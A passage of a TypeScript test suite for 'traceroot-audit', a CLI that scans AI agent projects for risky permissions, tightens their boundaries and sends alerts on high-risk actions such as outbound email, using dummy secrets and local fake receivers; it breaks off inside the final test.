import { createServer } from "node:http";
import { chmod, mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";

import fg from "fast-glob";
import { describe, expect, it } from "vitest";

import { runCli, type CliChoice, type CliPrompter } from "../src/cli/index";

function createCapture() {
  let stdout = "";
  let stderr = "";

  return {
    io: {
      stdout: (value: string) => {
        stdout += value;
      },
      stderr: (value: string) => {
        stderr += value;
      }
    },
    read: () => ({ stdout, stderr })
  };
}

async function createWebhookReceiver() {
  const queue: Array<Record<string, unknown>> = [];
  let resolver: ((value: Record<string, unknown>) => void) | null = null;
  let totalCount = 0;

  const server = createServer((req, res) => {
    let body = "";
    req.on("data", (chunk) => {
      body += chunk.toString();
    });
    req.on("end", () => {
      const payload =
        body.trim().length > 0 ? (JSON.parse(body) as Record<string, unknown>) : {};
      totalCount += 1;
      if (resolver) {
        resolver(payload);
        resolver = null;
      } else {
        queue.push(payload);
      }
      res.statusCode = 204;
      res.end();
    });
  });

  await new Promise<void>((resolve) => {
    server.listen(0, "127.0.0.1", () => resolve());
  });

  const address = server.address();
  if (!address || typeof address === "string") {
    throw new Error("Could not start webhook receiver");
  }

  return {
    url: `http://127.0.0.1:${address.port}/notify`,
    async waitForRequest(timeoutMs = 5000): Promise<Record<string, unknown>> {
      if (queue.length > 0) {
        return queue.shift()!;
      }

      return new Promise((resolve, reject) => {
        const timer = setTimeout(() => {
          resolver = null;
          reject(new Error("Timed out waiting for webhook request"));
        }, timeoutMs);

        resolver = (payload) => {
          clearTimeout(timer);
          resolve(payload);
        };
      });
    },
    getCount(): number {
      return totalCount;
    },
    async close(): Promise<void> {
      await new Promise<void>((resolve, reject) => {
        server.close((error) => {
          if (error) {
            reject(error);
            return;
          }

          resolve();
        });
      });
    }
  };
}

async function createFakeOpenClawMessenger() {
  const tempDir = await mkdtemp(path.join(os.tmpdir(), "traceroot-openclaw-messenger-"));
  const outputPath = path.join(tempDir, "messages.jsonl");
  const executablePath = path.join(tempDir, "openclaw");

  await writeFile(
    executablePath,
    `#!/usr/bin/env node
const fs = require("node:fs");
const outputPath = ${JSON.stringify(outputPath)};
fs.appendFileSync(outputPath, JSON.stringify({ argv: process.argv.slice(2) }) + "\\n", "utf8");
process.stdout.write("ok");
`,
    "utf8"
  );
  await chmod(executablePath, 0o755);

  return {
    executablePath,
    async waitForRequest(timeoutMs = 5000): Promise<string[]> {
      const startedAt = Date.now();

      while (Date.now() - startedAt < timeoutMs) {
        try {
          const content = await readFile(outputPath, "utf8");
          const lines = content
            .trim()
            .split("\n")
            .filter(Boolean)
            .map((line) => JSON.parse(line) as { argv: string[] });
          if (lines.length > 0) {
            return lines[0].argv;
          }
        } catch {
          // wait for first write
        }

        await new Promise((resolve) => setTimeout(resolve, 50));
      }

      throw new Error("Timed out waiting for OpenClaw relay request");
    },
    async getCount(): Promise<number> {
      try {
        const content = await readFile(outputPath, "utf8");
        return content
          .trim()
          .split("\n")
          .filter(Boolean).length;
      } catch {
        return 0;
      }
    },
    async close(): Promise<void> {
      await rm(tempDir, { recursive: true, force: true });
    }
  };
}

function createStaticPrompter(answers: {
  chooseOne?: string[];
  chooseMany?: string[][];
  confirm?: boolean[];
}): CliPrompter {
  const chooseOneAnswers = [...(answers.chooseOne ?? [])];
  const chooseManyAnswers = [...(answers.chooseMany ?? [])];
  const confirmAnswers = [...(answers.confirm ?? [])];

  return {
    async chooseOne(_question: string, choices: CliChoice[]) {
      const answer = chooseOneAnswers.shift();

      if (!answer || !choices.some((choice) => choice.value === answer)) {
        throw new Error(`Unexpected chooseOne answer: ${answer ?? "undefined"}`);
      }

      return answer;
    },
    async chooseMany(_question: string, choices: CliChoice[]) {
      const answer = chooseManyAnswers.shift();

      if (!answer || answer.some((value) => !choices.some((choice) => choice.value === value))) {
        throw new Error(`Unexpected chooseMany answer: ${answer?.join(", ") ?? "undefined"}`);
      }

      return answer;
    },
    async confirm() {
      const answer = confirmAnswers.shift();

      if (typeof answer !== "boolean") {
        throw new Error("Unexpected confirm answer");
      }

      return answer;
    }
  };
}

describe("CLI", () => {
  it("renders JSON output for scan", async () => {
    const capture = createCapture();
    const exitCode = await runCli(
      ["node", "traceroot-audit", "scan", "./examples/risky-skill", "--format", "json"],
      capture.io
    );

    const output = JSON.parse(capture.read().stdout);

    expect(exitCode).toBe(0);
    expect(output.target).toBe("./examples/risky-skill");
    expect(["project", "skill", "runtime"]).toContain(output.surface.kind);
    expect(Array.isArray(output.findings)).toBe(true);
    expect(output.summary.high).toBeGreaterThanOrEqual(1);
  });

  it("runs doctor as the simplest guided path and generates a safer bundle", async () => {
    const tempDir = await mkdtemp(path.join(os.tmpdir(), "traceroot-doctor-"));

    try {
      await writeFile(
        path.join(tempDir, ".env"),
        "SMTP_API_KEY=test\nAWS_SECRET_ACCESS_KEY=secret\nSTRIPE_SECRET_KEY=sk_test_123\n",
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "docker-compose.yml"),
        'services:\n  runtime:\n    ports:\n      - "0.0.0.0:11434:11434"\n',
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "mailer.ts"),
        "import fs from 'node:fs';\nimport nodemailer from 'nodemailer';\nfetch('https://api.example.com');\nfs.writeFileSync('out.txt', 'hello');\n",
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "package.json"),
        JSON.stringify(
          {
            name: "mail-runtime",
            scripts: {
              "send-email": "tsx mailer.ts"
            }
          },
          null,
          2
        ),
        "utf8"
      );
      const capture = createCapture();
      const exitCode = await runCli(
        ["node", "traceroot-audit", "doctor", tempDir],
        capture.io,
        createStaticPrompter({
          chooseMany: [["email-reply"]],
          chooseOne: ["always-confirm", "no-write", "localhost-only"],
          confirm: [true]
        })
      );

      const output = capture.read().stdout;

      expect(exitCode).toBe(0);
      expect(output).toContain("TraceRoot Audit Doctor");
      expect(output).toContain("权限收缩预览");
      expect(output).toContain("现在：email, filesystem, network");
      expect(output).toContain("收紧后：email, network");
      expect(output).toContain("TraceRoot 正在帮你收紧边界");
      expect(output).toContain("TraceRoot 已经先帮你准备好了这些内容");
      expect(output).toContain("TraceRoot 已经先帮你准备好了这些修复");
      expect(output).toContain("你把这套 bundle 应用进去后");
      expect(output).toContain("下面这些还需要你拍板");
      expect(output).toContain("要让这套更安全的运行态真正生效");
      expect(output).toContain("你当前的运行态配置仍然比你刚批准的边界更宽");
      expect(output).toContain("traceroot.apply.plan.md");
      expect(output).toContain("traceroot.env.agent.example");
      expect(output).toContain("动作审计现在已经开始盯住");
      expect(output).toContain("对外发邮件");
      expect(output).toContain("已经自动接好 1 个高风险动作入口");
      expect(output).toContain("traceroot-audit logs");
      expect(output).toContain("--today");
      expect(output).toContain("traceroot-audit doctor");
      expect(output).toContain("--watch --interval 60");
    } finally {
      await rm(tempDir, { recursive: true, force: true });
    }
  });

  it("can keep watching from doctor without switching to another command", async () => {
    const tempDir = await mkdtemp(path.join(os.tmpdir(), "traceroot-doctor-watch-"));
    const tempHome = await mkdtemp(path.join(os.tmpdir(), "traceroot-doctor-watch-home-"));
    const previousHome = process.env.HOME;

    try {
      await writeFile(
        path.join(tempDir, ".env"),
        "SMTP_API_KEY=test\nAWS_SECRET_ACCESS_KEY=secret\nSTRIPE_SECRET_KEY=sk_test_123\n",
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "docker-compose.yml"),
        'services:\n  runtime:\n    ports:\n      - "0.0.0.0:11434:11434"\n',
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "mailer.ts"),
        "import fs from 'node:fs';\nimport nodemailer from 'nodemailer';\nfetch('https://api.example.com');\nfs.writeFileSync('out.txt', 'hello');\n",
        "utf8"
      );
      process.env.HOME = tempHome;

      const capture = createCapture();
      const exitCode = await runCli(
        ["node", "traceroot-audit", "doctor", tempDir, "--watch", "--cycles", "1", "--interval", "1"],
        capture.io,
        createStaticPrompter({
          chooseMany: [["email-reply"]],
          chooseOne: ["always-confirm", "no-write", "localhost-only"],
          confirm: [true]
        })
      );

      const output = capture.read().stdout;

      expect(exitCode).toBe(0);
      expect(output).toContain("TraceRoot 现在会继续陪跑这个 agent");
      expect(output).toContain("TraceRoot Audit Doctor Watch");
      expect(output).toContain("Doctor Watch 现在会继续盯着");
      expect(output).toContain("TraceRoot 会安静地继续陪跑，不会反复刷屏");
      expect(output).toContain("审计日志:");
      expect(output).not.toContain("TraceRoot Audit Guard");
    } finally {
      if (previousHome === undefined) {
        delete process.env.HOME;
      } else {
        process.env.HOME = previousHome;
      }
      await rm(tempHome, { recursive: true, force: true });
      await rm(tempDir, { recursive: true, force: true });
    }
  });

  it("writes local runtime audit events and lets users review them with logs", async () => {
    const tempDir = await mkdtemp(path.join(os.tmpdir(), "traceroot-logs-target-"));
    const tempHome = await mkdtemp(path.join(os.tmpdir(), "traceroot-logs-home-"));
    const previousHome = process.env.HOME;

    try {
      await writeFile(
        path.join(tempDir, ".env"),
        "SMTP_API_KEY=test\nAWS_SECRET_ACCESS_KEY=secret\nSTRIPE_SECRET_KEY=sk_test_123\n",
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "docker-compose.yml"),
        'services:\n  runtime:\n    ports:\n      - "0.0.0.0:11434:11434"\n',
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "mailer.ts"),
        "import fs from 'node:fs';\nimport nodemailer from 'nodemailer';\nfetch('https://api.example.com');\nfs.writeFileSync('out.txt', 'hello');\n",
        "utf8"
      );
      process.env.HOME = tempHome;

      const watchCapture = createCapture();
      const watchExitCode = await runCli(
        [
          "node",
          "traceroot-audit",
          "doctor",
          tempDir,
          "--watch",
          "--cycles",
          "1",
          "--interval",
          "1"
        ],
        watchCapture.io,
        createStaticPrompter({
          chooseMany: [["email-reply"]],
          chooseOne: ["always-confirm", "no-write", "localhost-only"],
          confirm: [true]
        })
      );

      const eventsPath = path.join(tempHome, ".traceroot", "audit", "events.jsonl");
      const eventsContent = await readFile(eventsPath, "utf8");

      expect(watchExitCode).toBe(0);
      expect(eventsContent).toContain('"category":"watch-started"');
      expect(eventsContent).toContain('"category":"finding-change"');
      expect(eventsContent).toContain('"category":"boundary-drift"');

      const logsCapture = createCapture();
      const logsExitCode = await runCli(
        ["node", "traceroot-audit", "logs", tempDir, "--today", "--limit", "10"],
        logsCapture.io
      );

      const logsOutput = logsCapture.read().stdout;
      expect(logsExitCode).toBe(0);
      expect(logsOutput).toContain("TraceRoot Audit Logs");
      expect(logsOutput).toContain("正在查看");
      expect(logsOutput).toContain("当前运行态重新变宽了");
      expect(logsOutput).toContain("TraceRoot 已经开始陪跑这个 agent");
      expect(logsOutput).toContain("风险概览");
      expect(logsOutput).toContain("今天还没有触发值得单独提醒的 agent 动作");
      expect(logsOutput).toContain("最近发生的事");
      expect(logsOutput).toContain("当前配置仍然比你批准的边界更宽");
    } finally {
      if (previousHome === undefined) {
        delete process.env.HOME;
      } else {
        process.env.HOME = previousHome;
      }
      await rm(tempHome, { recursive: true, force: true });
      await rm(tempDir, { recursive: true, force: true });
    }
  });

  it("records wrapped high-risk actions through tap and surfaces them in logs", async () => {
    const tempDir = await mkdtemp(path.join(os.tmpdir(), "traceroot-tap-target-"));
    const tempHome = await mkdtemp(path.join(os.tmpdir(), "traceroot-tap-home-"));
    const previousHome = process.env.HOME;

    try {
      process.env.HOME = tempHome;

      const tapCapture = createCapture();
      const tapExitCode = await runCli(
        [
          "node",
          "traceroot-audit",
          "tap",
          "--action",
          "send-email",
          "--severity",
          "high-risk",
          "--target",
          tempDir,
          "--runtime",
          "openclaw",
          "--surface-kind",
          "runtime",
          "--recommendation",
          "Require confirmation before outbound email actions.",
          "--",
          process.execPath,
          "-e",
          "process.exit(0)"
        ],
        tapCapture.io
      );

      expect(tapExitCode).toBe(0);
      expect(tapCapture.read().stdout).toContain("TraceRoot 刚盯到一个值得你留意的动作");
      expect(tapCapture.read().stdout).toContain("对外发邮件");
      expect(tapCapture.read().stdout).toContain("TraceRoot 已经把这次动作记下来了");

      const eventsPath = path.join(tempHome, ".traceroot", "audit", "events.jsonl");
      const eventsContent = await readFile(eventsPath, "utf8");
      expect(eventsContent).toContain('"category":"action-event"');
      expect(eventsContent).toContain('"status":"attempted"');
      expect(eventsContent).toContain('"status":"succeeded"');

      const logsCapture = createCapture();
      const logsExitCode = await runCli(
        ["node", "traceroot-audit", "logs", tempDir, "--limit", "10"],
        logsCapture.io
      );

      expect(logsExitCode).toBe(0);
      expect(logsCapture.read().stdout).toContain("今天最值得留意的动作");
      expect(logsCapture.read().stdout).toContain("对外发邮件：出现了 1 次");
      expect(logsCapture.read().stdout).toContain("Agent 开始尝试：对外发邮件");
      expect(logsCapture.read().stdout).toContain("Agent 已完成：对外发邮件");
      expect(logsCapture.read().stdout).toContain("TraceRoot 建议先做: Require confirmation before outbound email actions.");
    } finally {
      if (previousHome === undefined) {
        delete process.env.HOME;
      } else {
        process.env.HOME = previousHome;
      }
      await rm(tempHome, { recursive: true, force: true });
      await rm(tempDir, { recursive: true, force: true });
    }
  });

  it("surfaces a live alert when a watched target triggers a high-risk action", async () => {
    const tempDir = await mkdtemp(path.join(os.tmpdir(), "traceroot-watch-alert-target-"));
    const tempHome = await mkdtemp(path.join(os.tmpdir(), "traceroot-watch-alert-home-"));
    const previousHome = process.env.HOME;

    try {
      await writeFile(
        path.join(tempDir, ".env"),
        "SMTP_API_KEY=test\nAWS_SECRET_ACCESS_KEY=secret\n",
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "docker-compose.yml"),
        'services:\n  runtime:\n    ports:\n      - "0.0.0.0:11434:11434"\n',
        "utf8"
      );
      process.env.HOME = tempHome;

      const watchCapture = createCapture();
      const watchPromise = runCli(
        [
          "node",
          "traceroot-audit",
          "doctor",
          tempDir,
          "--watch",
          "--cycles",
          "2",
          "--interval",
          "1"
        ],
        watchCapture.io,
        createStaticPrompter({
          chooseMany: [["email-reply"]],
          chooseOne: ["always-confirm", "no-write", "localhost-only"],
          confirm: [true]
        })
      );

      await new Promise((resolve) => setTimeout(resolve, 150));

      const tapCapture = createCapture();
      const tapExitCode = await runCli(
        [
          "node",
          "traceroot-audit",
          "tap",
          "--action",
          "send-email",
          "--severity",
          "high-risk",
          "--target",
          tempDir,
          "--runtime",
          "openclaw",
          "--surface-kind",
          "runtime",
          "--recommendation",
          "Require confirmation before outbound email actions.",
          "--",
          process.execPath,
          "-e",
          "process.exit(0)"
        ],
        tapCapture.io
      );

      const watchExitCode = await watchPromise;
      const watchOutput = watchCapture.read().stdout;

      expect(tapExitCode).toBe(0);
      expect(watchExitCode).toBe(0);
      expect(watchOutput).toContain("TraceRoot 实时提醒");
      expect(watchOutput).toContain("Agent 刚刚触发了一个高风险动作：对外发邮件");
      expect(watchOutput).toContain("想查看完整来龙去脉，可以运行：traceroot-audit logs");
    } finally {
      if (previousHome === undefined) {
        delete process.env.HOME;
      } else {
        process.env.HOME = previousHome;
      }
      await rm(tempHome, { recursive: true, force: true });
      await rm(tempDir, { recursive: true, force: true });
    }
  });

  it("surfaces a live alert when doctor watch ingests a runtime event feed", async () => {
    const tempDir = await mkdtemp(path.join(os.tmpdir(), "traceroot-feed-alert-target-"));
    const tempHome = await mkdtemp(path.join(os.tmpdir(), "traceroot-feed-alert-home-"));
    const previousHome = process.env.HOME;

    try {
      await writeFile(
        path.join(tempDir, ".env"),
        "SMTP_API_KEY=test\nAWS_SECRET_ACCESS_KEY=secret\n",
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "docker-compose.yml"),
        'services:\n  runtime:\n    ports:\n      - "0.0.0.0:11434:11434"\n',
        "utf8"
      );
      process.env.HOME = tempHome;

      const watchCapture = createCapture();
      const watchPromise = runCli(
        [
          "node",
          "traceroot-audit",
          "doctor",
          tempDir,
          "--watch",
          "--cycles",
          "2",
          "--interval",
          "1"
        ],
        watchCapture.io,
        createStaticPrompter({
          chooseMany: [["email-reply"]],
          chooseOne: ["always-confirm", "no-write", "localhost-only"],
          confirm: [true]
        })
      );

      await new Promise((resolve) => setTimeout(resolve, 150));
      await mkdir(path.join(tempDir, "logs"), { recursive: true });
      await writeFile(
        path.join(tempDir, "logs", "openclaw-events.jsonl"),
        `${JSON.stringify({
          timestamp: new Date().toISOString(),
          action: "send-email",
          severity: "high-risk",
          status: "attempted",
          runtime: "openclaw",
          message: "OpenClaw 正在准备发一封外部邮件。",
          recommendation: "先确认这封外部邮件是不是真的该发出去。"
        })}\n`,
        "utf8"
      );

      const watchExitCode = await watchPromise;
      const watchOutput = watchCapture.read().stdout;

      expect(watchExitCode).toBe(0);
      expect(watchOutput).toContain("TraceRoot 实时提醒");
      expect(watchOutput).toContain("Agent 刚刚触发了一个高风险动作：对外发邮件");

      const logsCapture = createCapture();
      const logsExitCode = await runCli(
        ["node", "traceroot-audit", "logs", tempDir, "--today", "--limit", "10"],
        logsCapture.io
      );

      expect(logsExitCode).toBe(0);
      expect(logsCapture.read().stdout).toContain("OpenClaw 正在准备发一封外部邮件。");
      expect(logsCapture.read().stdout).toContain("对外发邮件：出现了 1 次");
    } finally {
      if (previousHome === undefined) {
        delete process.env.HOME;
      } else {
        process.env.HOME = previousHome;
      }
      await rm(tempHome, { recursive: true, force: true });
      await rm(tempDir, { recursive: true, force: true });
    }
  });

  it("understands nested OpenClaw-style runtime events and shows human action labels", async () => {
    const tempDir = await mkdtemp(path.join(os.tmpdir(), "traceroot-openclaw-feed-target-"));
    const tempHome = await mkdtemp(path.join(os.tmpdir(), "traceroot-openclaw-feed-home-"));
    const previousHome = process.env.HOME;

    try {
      await writeFile(
        path.join(tempDir, ".env"),
        "BANK_TOKEN=test\nPRIVATE_DATA_KEY=secret\n",
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "docker-compose.yml"),
        'services:\n  runtime:\n    ports:\n      - "127.0.0.1:11434:11434"\n',
        "utf8"
      );
      process.env.HOME = tempHome;

      const watchCapture = createCapture();
      const watchPromise = runCli(
        [
          "node",
          "traceroot-audit",
          "doctor",
          tempDir,
          "--watch",
          "--cycles",
          "2",
          "--interval",
          "1"
        ],
        watchCapture.io,
        createStaticPrompter({
          chooseMany: [["market-monitoring"]],
          chooseOne: ["always-confirm", "no-write", "localhost-only"],
          confirm: [true]
        })
      );

      await new Promise((resolve) => setTimeout(resolve, 150));
      await mkdir(path.join(tempDir, ".openclaw", "logs"), { recursive: true });
      await writeFile(
        path.join(tempDir, ".openclaw", "logs", "session-actions.jsonl"),
        `${JSON.stringify({
          timestamp: new Date().toISOString(),
          source: "openclaw-runtime",
          event: {
            type: "bank-access",
            status: "started",
            runtime: "OpenClaw",
            target: "accounts/checking",
            message: "OpenClaw 正在读取一个银行账户概览。",
            recommendation: "先确认这次金融数据访问是不是你刚刚要求它去做的。"
          }
        })}\n`,
        "utf8"
      );

      const watchExitCode = await watchPromise;
      const watchOutput = watchCapture.read().stdout;

      expect(watchExitCode).toBe(0);
      expect(watchOutput).toContain("TraceRoot 实时提醒");
      expect(watchOutput).toContain("访问银行或支付账户");

      const logsCapture = createCapture();
      const logsExitCode = await runCli(
        ["node", "traceroot-audit", "logs", tempDir, "--today", "--limit", "10"],
        logsCapture.io
      );

      expect(logsExitCode).toBe(0);
      expect(logsCapture.read().stdout).toContain("OpenClaw 正在读取一个银行账户概览。");
      expect(logsCapture.read().stdout).toContain("访问银行或支付账户：出现了 1 次");
    } finally {
      if (previousHome === undefined) {
        delete process.env.HOME;
      } else {
        process.env.HOME = previousHome;
      }
      await rm(tempHome, { recursive: true, force: true });
      await rm(tempDir, { recursive: true, force: true });
    }
  });

  it("can send a webhook reminder when doctor watch sees a high-risk action", async () => {
    const tempDir = await mkdtemp(path.join(os.tmpdir(), "traceroot-webhook-target-"));
    const tempHome = await mkdtemp(path.join(os.tmpdir(), "traceroot-webhook-home-"));
    const previousHome = process.env.HOME;
    const webhook = await createWebhookReceiver();

    try {
      await writeFile(
        path.join(tempDir, ".env"),
        "SMTP_API_KEY=test\nAWS_SECRET_ACCESS_KEY=secret\n",
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "docker-compose.yml"),
        'services:\n  runtime:\n    ports:\n      - "0.0.0.0:11434:11434"\n',
        "utf8"
      );
      process.env.HOME = tempHome;

      const watchCapture = createCapture();
      const watchPromise = runCli(
        [
          "node",
          "traceroot-audit",
          "doctor",
          tempDir,
          "--watch",
          "--cycles",
          "2",
          "--interval",
          "1",
          "--notify-webhook",
          webhook.url
        ],
        watchCapture.io,
        createStaticPrompter({
          chooseMany: [["email-reply"]],
          chooseOne: ["always-confirm", "no-write", "localhost-only"],
          confirm: [true]
        })
      );

      await new Promise((resolve) => setTimeout(resolve, 150));

      const tapExitCode = await runCli(
        [
          "node",
          "traceroot-audit",
          "tap",
          "--action",
          "send-email",
          "--severity",
          "high-risk",
          "--target",
          tempDir,
          "--runtime",
          "openclaw",
          "--surface-kind",
          "runtime",
          "--recommendation",
          "先确认这封外部邮件是不是真的该发出去。",
          "--",
          process.execPath,
          "-e",
          "process.exit(0)"
        ],
        createCapture().io
      );

      const payload = await webhook.waitForRequest();
      const watchExitCode = await watchPromise;
      const watchOutput = watchCapture.read().stdout;

      expect(tapExitCode).toBe(0);
      expect(watchExitCode).toBe(0);
      expect(watchOutput).toContain("高风险动作一出现，TraceRoot 也会同步把提醒发到你接好的通知入口");
      expect(payload.title).toBe("TraceRoot 刚盯到一个高风险动作");
      expect(payload.summary).toBe("Agent 刚刚触发了一个高风险动作：对外发邮件");
      expect(payload.severity).toBe("high-risk");
      expect(payload.actionLabel).toBe("对外发邮件");
      expect(payload.recommendation).toBe("先确认这封外部邮件是不是真的该发出去。");
    } finally {
      await webhook.close();
      if (previousHome === undefined) {
        delete process.env.HOME;
      } else {
        process.env.HOME = previousHome;
      }
      await rm(tempHome, { recursive: true, force: true });
      await rm(tempDir, { recursive: true, force: true });
    }
  });

  it("does not spam duplicate webhook reminders for the same action in a short window", async () => {
    const tempDir = await mkdtemp(path.join(os.tmpdir(), "traceroot-webhook-dedupe-target-"));
    const tempHome = await mkdtemp(path.join(os.tmpdir(), "traceroot-webhook-dedupe-home-"));
    const previousHome = process.env.HOME;
    const webhook = await createWebhookReceiver();

    try {
      await writeFile(
        path.join(tempDir, ".env"),
        "SMTP_API_KEY=test\nAWS_SECRET_ACCESS_KEY=secret\n",
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "docker-compose.yml"),
        'services:\n  runtime:\n    ports:\n      - "0.0.0.0:11434:11434"\n',
        "utf8"
      );
      process.env.HOME = tempHome;

      const watchPromise = runCli(
        [
          "node",
          "traceroot-audit",
          "doctor",
          tempDir,
          "--watch",
          "--cycles",
          "3",
          "--interval",
          "1",
          "--notify-webhook",
          webhook.url
        ],
        createCapture().io,
        createStaticPrompter({
          chooseMany: [["email-reply"]],
          chooseOne: ["always-confirm", "no-write", "localhost-only"],
          confirm: [true]
        })
      );

      await new Promise((resolve) => setTimeout(resolve, 150));

      const tapArgs = [
        "node",
        "traceroot-audit",
        "tap",
        "--action",
        "send-email",
        "--severity",
        "high-risk",
        "--target",
        tempDir,
        "--runtime",
        "openclaw",
        "--surface-kind",
        "runtime",
        "--recommendation",
        "先确认这封外部邮件是不是真的该发出去。",
        "--",
        process.execPath,
        "-e",
        "process.exit(0)"
      ];

      await runCli(tapArgs, createCapture().io);
      await webhook.waitForRequest();
      await runCli(tapArgs, createCapture().io);
      await new Promise((resolve) => setTimeout(resolve, 1200));
      await watchPromise;

      expect(webhook.getCount()).toBe(1);
    } finally {
      await webhook.close();
      if (previousHome === undefined) {
        delete process.env.HOME;
      } else {
        process.env.HOME = previousHome;
      }
      await rm(tempHome, { recursive: true, force: true });
      await rm(tempDir, { recursive: true, force: true });
    }
  });

  it("can send a chat-channel reminder through OpenClaw when doctor watch sees a high-risk action", async () => {
    const tempDir = await mkdtemp(path.join(os.tmpdir(), "traceroot-channel-target-"));
    const tempHome = await mkdtemp(path.join(os.tmpdir(), "traceroot-channel-home-"));
    const previousHome = process.env.HOME;
    const previousOpenClawBin = process.env.TRACEROOT_NOTIFY_OPENCLAW_BIN;
    const messenger = await createFakeOpenClawMessenger();

    try {
      await writeFile(
        path.join(tempDir, ".env"),
        "SMTP_API_KEY=test\nAWS_SECRET_ACCESS_KEY=secret\n",
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "docker-compose.yml"),
        'services:\n  runtime:\n    ports:\n      - "0.0.0.0:11434:11434"\n',
        "utf8"
      );
      process.env.HOME = tempHome;
      process.env.TRACEROOT_NOTIFY_OPENCLAW_BIN = messenger.executablePath;

      const watchCapture = createCapture();
      const watchPromise = runCli(
        [
          "node",
          "traceroot-audit",
          "doctor",
          tempDir,
          "--watch",
          "--cycles",
          "2",
          "--interval",
          "1",
          "--notify-channel",
          "whatsapp",
          "--notify-target",
          "+4917612345678"
        ],
        watchCapture.io,
        createStaticPrompter({
          chooseMany: [["email-reply"]],
          chooseOne: ["always-confirm", "no-write", "localhost-only"],
          confirm: [true]
        })
      );

      await new Promise((resolve) => setTimeout(resolve, 150));

      const tapExitCode = await runCli(
        [
          "node",
          "traceroot-audit",
          "tap",
          "--action",
          "send-email",
          "--severity",
          "high-risk",
          "--target",
          tempDir,
          "--runtime",
          "openclaw",
          "--surface-kind",
          "runtime",
          "--recommendation",
          "先确认这封外部邮件是不是真的该发出去。",
          "--",
          process.execPath,
          "-e",
          "process.exit(0)"
        ],
        createCapture().io
      );

      const argv = await messenger.waitForRequest();
      const watchExitCode = await watchPromise;
      const watchOutput = watchCapture.read().stdout;

      expect(tapExitCode).toBe(0);
      expect(watchExitCode).toBe(0);
      expect(watchOutput).toContain("whatsapp → +4917612345678");
      expect(argv).toContain("message");
      expect(argv).toContain("send");
      expect(argv).toContain("--channel");
      expect(argv).toContain("whatsapp");
      expect(argv).toContain("--target");
      expect(argv).toContain("+4917612345678");
      expect(argv.join(" ")).toContain("TraceRoot 刚盯到一个高风险动作");
      expect(argv.join(" ")).toContain("动作：对外发邮件");
    } finally {
      await messenger.close();
      if (previousHome === undefined) {
        delete process.env.HOME;
      } else {
        process.env.HOME = previousHome;
      }
      if (previousOpenClawBin === undefined) {
        delete process.env.TRACEROOT_NOTIFY_OPENCLAW_BIN;
      } else {
        process.env.TRACEROOT_NOTIFY_OPENCLAW_BIN = previousOpenClawBin;
      }
      await rm(tempHome, { recursive: true, force: true });
      await rm(tempDir, { recursive: true, force: true });
    }
  });

  it("does not spam duplicate chat-channel reminders for the same action in a short window", async () => {
    const tempDir = await mkdtemp(path.join(os.tmpdir(), "traceroot-channel-dedupe-target-"));
    const tempHome = await mkdtemp(path.join(os.tmpdir(), "traceroot-channel-dedupe-home-"));
    const previousHome = process.env.HOME;
    const previousOpenClawBin = process.env.TRACEROOT_NOTIFY_OPENCLAW_BIN;
    const messenger = await createFakeOpenClawMessenger();

    try {
      await writeFile(
        path.join(tempDir, ".env"),
        "SMTP_API_KEY=test\nAWS_SECRET_ACCESS_KEY=secret\n",
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "docker-compose.yml"),
        'services:\n  runtime:\n    ports:\n      - "0.0.0.0:11434:11434"\n',
        "utf8"
      );
      process.env.HOME = tempHome;
      process.env.TRACEROOT_NOTIFY_OPENCLAW_BIN = messenger.executablePath;

      const watchPromise = runCli(
        [
          "node",
          "traceroot-audit",
          "doctor",
          tempDir,
          "--watch",
          "--cycles",
          "3",
          "--interval",
          "1",
          "--notify-channel",
          "telegram",
          "--notify-target",
          "@ops"
        ],
        createCapture().io,
        createStaticPrompter({
          chooseMany: [["email-reply"]],
          chooseOne: ["always-confirm", "no-write", "localhost-only"],
          confirm: [true]
        })
      );

      await new Promise((resolve) => setTimeout(resolve, 150));

      const tapArgs = [
        "node",
        "traceroot-audit",
        "tap",
        "--action",
        "send-email",
        "--severity",
        "high-risk",
        "--target",
        tempDir,
        "--runtime",
        "openclaw",
        "--surface-kind",
        "runtime",
        "--recommendation",
        "先确认这封外部邮件是不是真的该发出去。",
        "--",
        process.execPath,
        "-e",
        "process.exit(0)"
      ];

      await runCli(tapArgs, createCapture().io);
      await messenger.waitForRequest();
      await runCli(tapArgs, createCapture().io);
      await new Promise((resolve) => setTimeout(resolve, 1200));
      await watchPromise;

      expect(await messenger.getCount()).toBe(1);
    } finally {
      await messenger.close();
      if (previousHome === undefined) {
        delete process.env.HOME;
      } else {
        process.env.HOME = previousHome;
      }
      if (previousOpenClawBin === undefined) {
        delete process.env.TRACEROOT_NOTIFY_OPENCLAW_BIN;
      } else {
        process.env.TRACEROOT_NOTIFY_OPENCLAW_BIN = previousOpenClawBin;
      }
      await rm(tempHome, { recursive: true, force: true });
      await rm(tempDir, { recursive: true, force: true });
    }
  });

  it("explains missing chat target when a notify channel is chosen without one", async () => {
    const tempDir = await mkdtemp(path.join(os.tmpdir(), "traceroot-channel-validation-"));
    const tempHome = await mkdtemp(path.join(os.tmpdir(), "traceroot-channel-validation-home-"));
    const previousHome = process.env.HOME;

    try {
      await writeFile(
        path.join(tempDir, ".env"),
        "SMTP_API_KEY=test\nAWS_SECRET_ACCESS_KEY=secret\n",
        "utf8"
      );
      await writeFile(
        path.join(tempDir, "docker-compose.yml"),
        'services:\n  runtime:\n    ports:\n      - "0.0.0.0:11434:11434"\n',
        "utf8"
      );
      process.env.HOME = tempHome;

      const capture = createCapture();
      const exitCode = await runCli(
        [
          "node",
          "traceroot-audit",
          "doctor",
          tempDir,
          "--watch",
          "--cycles",
          "1",
          "--interval",
          "1",
          "--notify-channel",
          "telegram"
        ],
        capture.io,
        createStaticPrompter({
          chooseMany: [["email-reply"]],
          chooseOne: ["always-confirm", "no-write", "localhost-only"],
          confirm: [true]
        })
      );

      expect(exitCode).toBe(1);
